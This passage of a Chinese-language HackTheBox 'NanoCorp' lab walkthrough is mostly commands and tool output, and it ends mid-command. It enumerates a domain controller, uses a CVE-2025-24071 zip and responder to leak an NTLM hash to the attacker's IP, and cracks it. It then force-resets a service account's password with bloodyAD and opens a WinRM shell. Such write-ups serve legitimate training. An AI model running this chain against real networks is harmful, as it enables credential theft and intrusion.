class=\"hljs-keyword\"\u003efor\u003c/span\u003e host (test conditions non-ideal).\nNetwork Distance: \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e hops\nService Info: Hosts: nanocorp.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode:\n|   \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e:\n|_    Message signing enabled \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e required\n| smb2-time:\n|   date: \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-11T14:\u003cspan class=\"hljs-number\"\u003e58\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e\n|_  start_date: N/A\n|_clock-skew: 6h31m49s\n\nTRACEROUTE (using proto \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e/icmp)\nHOP RTT       ADDRESS\n\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e758.68\u003c/span\u003e ms \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.14\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e758.91\u003c/span\u003e ms \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\n\nOS \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e Service detection performed. Please report \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e incorrect results at https://nmap.org/submit/ .\nNmap done: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e IP address (\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e69.94\u003c/span\u003e seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e枚举\u003c/h3\u003e\n\u003cp\u003e80 端口\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20NanoCorp/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e目录扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜ gobuster \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e -w /usr/share/wordlists/dirbuster/directory-\u003cspan class=\"hljs-built_in\"\u003elist\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e2.3\u003c/span\u003e-medium.txt -x text,\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e -u http://nanocorp.htb/\n===============================================================\nGobuster v3\u003cspan class=\"hljs-number\"\u003e.6\u003c/span\u003e\nby OJ Reeves (@TheColonial) \u0026#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://nanocorp.htb/\n[+] Method:                  GET\n[+] Threads:                 \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-\u003cspan class=\"hljs-built_in\"\u003elist\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e2.3\u003c/span\u003e-medium.txt\n[+] Negative Status codes:   \u003cspan class=\"hljs-number\"\u003e404\u003c/span\u003e\n[+] User Agent:              gobuster/\u003cspan class=\"hljs-number\"\u003e3.6\u003c/span\u003e\n[+] Extensions:              text,\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e directory enumeration mode\n===============================================================\n/img                  (Status: \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e334\u003c/span\u003e] [--\u003e http://nanocorp.htb/img/]\n/css                  (Status: \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e334\u003c/span\u003e] [--\u003e http://nanocorp.htb/css/]\n/js                   (Status: \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e333\u003c/span\u003e] [--\u003e http://nanocorp.htb/js/]\n/examples             (Status: \u003cspan class=\"hljs-number\"\u003e503\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e401\u003c/span\u003e]\n/licenses             (Status: \u003cspan class=\"hljs-number\"\u003e403\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e420\u003c/span\u003e]\n/%\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e                  (Status: \u003cspan class=\"hljs-number\"\u003e403\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e]\n/IMG                  (Status: \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e334\u003c/span\u003e] [--\u003e http://nanocorp.htb/IMG/]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e主站是看着没有什么的，尝试一下爆一下子域名\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜ ffuf -u \u003cspan class=\"hljs-string\"\u003e'http://nanocorp.htb/'\u003c/span\u003e -H \u003cspan class=\"hljs-string\"\u003e'host:FUZZ.nanocorp.htb'\u003c/span\u003e -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-\u003cspan class=\"hljs-number\"\u003e110000.\u003c/span\u003etxt -fc \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e\n\n        /\u003cspan class=\"hljs-string\"\u003e'___\\  /'\u003c/span\u003e___\\           /\u003cspan class=\"hljs-string\"\u003e'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://nanocorp.htb/\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n :: Header           : Host: FUZZ.nanocorp.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response status: 301\n________________________________________________\n\n:: Progress: [114442/114442] :: Job [1/1] :: 840 req/sec :: Duration: [0:02:37] :: Errors: 0 ::\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e换个字典，爆破到存在 \u003ccode\u003ehire\u003c/code\u003e 子域名\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜ ffuf -u \u003cspan class=\"hljs-string\"\u003e'http://nanocorp.htb/'\u003c/span\u003e -H \u003cspan class=\"hljs-string\"\u003e'host:FUZZ.nanocorp.htb'\u003c/span\u003e -w /usr/share/wordlists/fuzzDicts/subdomainDicts/dic1.txt -fc \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e \n\n        /\u003cspan class=\"hljs-string\"\u003e'___\\  /'\u003c/span\u003e___\\           /\u003cspan class=\"hljs-string\"\u003e'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://nanocorp.htb/\n :: Wordlist         : FUZZ: /usr/share/wordlists/fuzzDicts/subdomainDicts/dic1.txt\n :: Header           : Host: FUZZ.nanocorp.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response status: 301\n________________________________________________\n\nhire                    [Status: 200, Size: 2520, Words: 646, Lines: 68, Duration: 71ms]\n[WARN] Caught keyboard interrupt (Ctrl-C)\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eCVE-2025-24071\u003c/h2\u003e\n\u003cp\u003e将 \u003ccode\u003ehire.nanocorp.htb\u003c/code\u003e 添加到 \u003ccode\u003e/etc/hosts\u003c/code\u003e ，然后访问\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20NanoCorp/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e能上传 \u003ccode\u003ezip\u003c/code\u003e 文件，上传后提示我们提取成功，并会回复我们\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20NanoCorp/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这让我想起 \u003ccode\u003eZipSlip\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e随后我在文件上传功能中测试了很多，但都是没有效果\u003c/p\u003e\n\u003cp\u003e或者漏洞并不存在于 web 中，而是存在 windows 中\u003c/p\u003e\n\u003cp\u003e我通过搜索引擎搜索中能找到很多关于 winzip 或者 2025-24071 的漏洞\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20NanoCorp/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003ewinzip 的漏洞没有提供 POC，而且报告比较含糊，而 CVE-2025-24071 有，所以这里索性尝试下\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eNSFOCUS CERT 检测到微软近期发布了一项安全更新，旨在修复 Windows 文件资源管理器中的一个严重欺骗漏洞，该漏洞编号为 \u003cstrong\u003eCVE-2025-24071\u003c/strong\u003e 。此漏洞的 CVSS 评分为 7.5，表明其严重性较高。该问题源于 Windows 资源管理器中 \u003ccode\u003e.library-ms\u003c/code\u003e 文件的隐式信任和自动文件解析行为。未经身份验证的攻击者可以通过构建包含恶意 SMB 路径的 RAR/ZIP 文件来利用此漏洞。解压缩后，这将触发 SMB 身份验证请求，从而可能暴露用户的 NTLM 哈希值。目前，针对此漏洞的概念验证 (PoC) 攻击代码已公开，因此该漏洞构成当前威胁。强烈建议受影响的用户立即应用此补丁以降低风险。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e生成 exploit.zip\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜  CVE-\u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e24071\u003c/span\u003e git:(main) ✗ python exploit.py -i \u0026#x3C;your-i -f exploit\n\n          ______ ____    ____  _______       ___     ___    ___    _____        ___    _  _      ___    ______   __  \n         /      |\\   \\  /   / |   ____|     |__ \\   / _ \\  |__ \\  | ____|      |__ \\  | || |    / _ \\  |____  | /_ | \n        |  ,----\u003cspan class=\"hljs-string\"\u003e' \\   \\/   /  |  |__    ______ ) | | | | |    ) | | |__    ______ ) | | || |_  | | | |     / /   | | \n        |  |       \\      /   |   __|  |______/ /  | | | |   / /  |___ \\  |______/ /  |__   _| | | | |    / /    | | \n        |  `----.   \\    /    |  |____       / /_  | |_| |  / /_   ___) |       / /_     | |   | |_| |   / /     | | \n         \\______|    \\__/     |_______|     |____|  \\___/  |____| |____/       |____|    |_|    \\___/   /_/      |_| \n                                                \n                                                \n                                                Windows File Explorer Spoofing Vulnerability (CVE-2025-24071)\n                    by ThemeHackers\n    \nCreating exploit with filename: exploit.library-ms\nTarget IP: \u0026#x3C;your-ip\u003e\n\nGenerating library file...\n✓ Library file created successfully\n\nCreating ZIP archive...\n✓ ZIP file created successfully\n\nCleaning up temporary files...\n✓ Cleanup completed\n\nProcess completed successfully!\nOutput file: exploit.zip\nRun this file on the victim machine and you will see the effects of the vulnerability such as using ftp smb to send files etc.\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eresponder\u003c/code\u003e 监听\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜ responder -I tun0\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后上传刚刚生成 \u003ccode\u003eexploit.zip\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e过了一会 \u003ccode\u003eresponder\u003c/code\u003e 就能抓到了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20NanoCorp/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e通过 \u003ccode\u003ehashcat\u003c/code\u003e 进行爆破\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜ hashcat -m \u003cspan class=\"hljs-number\"\u003e5600\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e /usr/share/wordlists/rockyou.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到密码 \u003ccode\u003edksehdgh712!@#\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20NanoCorp/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e测试凭据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜ nxc smb \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e -u \u003cspan class=\"hljs-string\"\u003e'WEB_SVC'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'dksehdgh712!@#'\u003c/span\u003e                                     \nSMB         \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e     \u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    DC01             [*] Windows Server \u003cspan class=\"hljs-number\"\u003e2022\u003c/span\u003e Build \u003cspan class=\"hljs-number\"\u003e20348\u003c/span\u003e x64 (name:DC01) (domain:nanocorp.htb) (signing:\u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e) (SMBv1:\u003cspan class=\"hljs-literal\"\u003eFalse\u003c/span\u003e) \nSMB         \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e     \u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    DC01             [+] nanocorp.htb\\WEB_SVC:dksehdgh712!@\u003cspan class=\"hljs-comment\"\u003e# \u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜ nxc winrm \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e -u \u003cspan class=\"hljs-string\"\u003e'WEB_SVC'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'dksehdgh712!@#'\u003c/span\u003e                                 \nWINRM-SSL   \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e     \u003cspan class=\"hljs-number\"\u003e5986\u003c/span\u003e   DC01             [*] Windows Server \u003cspan class=\"hljs-number\"\u003e2022\u003c/span\u003e Build \u003cspan class=\"hljs-number\"\u003e20348\u003c/span\u003e (name:DC01) (domain:nanocorp.htb)\n  arc4 = algorithms.ARC4(\u003cspan class=\"hljs-variable language_\"\u003eself\u003c/span\u003e._key)\nWINRM-SSL   \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e     \u003cspan class=\"hljs-number\"\u003e5986\u003c/span\u003e   DC01             [-] nanocorp.htb\\WEB_SVC:dksehdgh712!@\u003cspan class=\"hljs-comment\"\u003e#\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e横向移动\u003c/h2\u003e\n\u003ch3\u003e路径探寻\u003c/h3\u003e\n\u003cp\u003e上寻血猎犬\u003c/p\u003e\n\u003cp\u003e这里的需要设置一下 \u003ccode\u003edns-timeout\u003c/code\u003e ，我这里总是会超时\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜ bloodhound-python -d nanocorp.htb -u \u003cspan class=\"hljs-string\"\u003e'WEB_SVC'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'dksehdgh712!@#'\u003c/span\u003e -dc dc01.nanocorp.htb -ns \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e -c \u003cspan class=\"hljs-built_in\"\u003eall\u003c/span\u003e --\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e --dns-timeout \u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e能给自己添加到 \u003ccode\u003eIT_SUPPORT\u003c/code\u003e ，并且 \u003ccode\u003eIT_SUPPORT\u003c/code\u003e 可以修改 \u003ccode\u003eMONITORING_SVC\u003c/code\u003e 的密码\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20NanoCorp/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003eGot MONITORING_SVC shell\u003c/h3\u003e\n\u003cp\u003e这些操作都可以通过 \u003ccode\u003ebloodyAD\u003c/code\u003e 来完成\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# 添加组操作\u003c/span\u003e\n➜ bloodyad -d \u003cspan class=\"hljs-string\"\u003e'nanocorp.htb'\u003c/span\u003e -u \u003cspan class=\"hljs-string\"\u003e'WEB_SVC'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'dksehdgh712!@#'\u003c/span\u003e -i \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e add groupMember IT_SUPPORT WEB_SVC\n[+] WEB_SVC added to IT_SUPPORT\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# 强制修改密码\u003c/span\u003e\n➜ bloodyad -d \u003cspan class=\"hljs-string\"\u003e'nanocorp.htb'\u003c/span\u003e -u \u003cspan class=\"hljs-string\"\u003e'WEB_SVC'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'dksehdgh712!@#'\u003c/span\u003e -i \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e password MONITORING_SVC Admin@\u003cspan class=\"hljs-number\"\u003e123\u003c/span\u003e\n[+] Password changed successfully!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e完成后测试凭据，发现提示 \u003ccode\u003eSTATUS_ACCOUNT_RESTRICTION\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enxc smb \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e -u \u003cspan class=\"hljs-string\"\u003e'MONITORING_SVC'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'Admin@123'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看一下用户 \u003ccode\u003eMONITORING_SVC\u003c/code\u003e 所属组，发现其是 \u003ccode\u003eProtected Users\u003c/code\u003e 组成员\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜ bloodyad -d \u003cspan class=\"hljs-string\"\u003e'nanocorp.htb'\u003c/span\u003e -u \u003cspan class=\"hljs-string\"\u003e'WEB_SVC'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'dksehdgh712!@#'\u003c/span\u003e -i \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e get membership \u003cspan class=\"hljs-string\"\u003e'CN=MONITORING_SVC,OU=AD_MONITORING,DC=NANOCORP,DC=HTB'\u003c/span\u003e\n\ndistinguishedName: CN=Users,CN=Builtin,DC=nanocorp,DC=htb\nobjectSid: S-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e32\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e545\u003c/span\u003e\nsAMAccountName: Users\n\ndistinguishedName: CN=Remote Management Users,CN=Builtin,DC=nanocorp,DC=htb\nobjectSid: S-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e32\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e580\u003c/span\u003e\nsAMAccountName: Remote Management Users\n\ndistinguishedName: CN=Domain Users,CN=Users,DC=nanocorp,DC=htb\nobjectSid: S-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e2261381271\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e1331810270\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e697239744\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e513\u003c/span\u003e\nsAMAccountName: Domain Users\n\ndistinguishedName: CN=Protected Users,CN=Users,DC=nanocorp,DC=htb\nobjectSid: S-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e2261381271\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e1331810270\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e697239744\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e525\u003c/span\u003e\nsAMAccountName: Protected Users\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e一般可以通过 Kerberos 验证即可\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜ getTGT.py nanocorp.htb/MONITORING_SVC:\u003cspan class=\"hljs-string\"\u003e'Admin@123'\u003c/span\u003e \n  \u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e pkg_resources\nImpacket v0\u003cspan class=\"hljs-number\"\u003e.12\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e - Copyright Fortra, LLC \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e its affiliated companies \n\n[*] Saving ticket \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e MONITORING_SVC.ccache\n\n➜ export KRB5CCNAME=MONITORING_SVC.ccache \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e还需要生成 \u003ccode\u003ekrb5.conf\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜ nxc smb \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e -u \u003cspan class=\"hljs-string\"\u003e'WEB_SVC'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'dksehdgh712!@#'\u003c/span\u003e --generate-krb5-file /etc/krb5.conf\nSMB         \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e     \u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    DC01             [*] Windows Server \u003cspan class=\"hljs-number\"\u003e2022\u003c/span\u003e Build \u003cspan class=\"hljs-number\"\u003e20348\u003c/span\u003e x64 (name:DC01) (domain:nanocorp.htb) (signing:\u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e) (SMBv1:\u003cspan class=\"hljs-literal\"\u003eFalse\u003c/span\u003e) \nSMB         \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e     \u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    DC01             [+] nanocorp.htb\\WEB_SVC:dksehdgh712!@\u003cspan class=\"hljs-comment\"\u003e# \u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再次测试凭据，这次可以正常了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜ nxc smb \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e -k --use-kcache          \nSMB         \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e     \u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    DC01             [*] Windows Server \u003cspan class=\"hljs-number\"\u003e2022\u003c/span\u003e Build \u003cspan class=\"hljs-number\"\u003e20348\u003c/span\u003e x64 (name:DC01) (domain:nanocorp.htb) (signing:\u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e) (SMBv1:\u003cspan class=\"hljs-literal\"\u003eFalse\u003c/span\u003e) \nSMB         \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e     \u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    DC01             [+] NANOCORP.HTB\\MONITORING_SVC \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e ccache\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eevil-winrm\u003c/code\u003e 一直连不上，这里换成 \u003ccode\u003ewinrmexec\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜ python winrmexec/winrmexec.py -dc-ip \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e nanocorp.htb/MONITORING_SVC:\u003cspan class=\"hljs-string\"\u003e'Admin@123'\u003c/span\u003e@dc01.nanocorp.htb -k -ssl -port \u003cspan class=\"hljs-number\"\u003e5986\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20NanoCorp/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e能读取 user.txt\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20NanoCorp/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003eGot Root.txt via CVE-2024-0670\u003c/h3\u003e\n\u003cp\u003e枚举可写对象\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜  NanoCorp bloodyad -d \u003cspan class=\"hljs-string\"\u003e'nanocorp.htb'\u003c/span\u003e -i \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e -H dc01.nanocorp.htb -k get 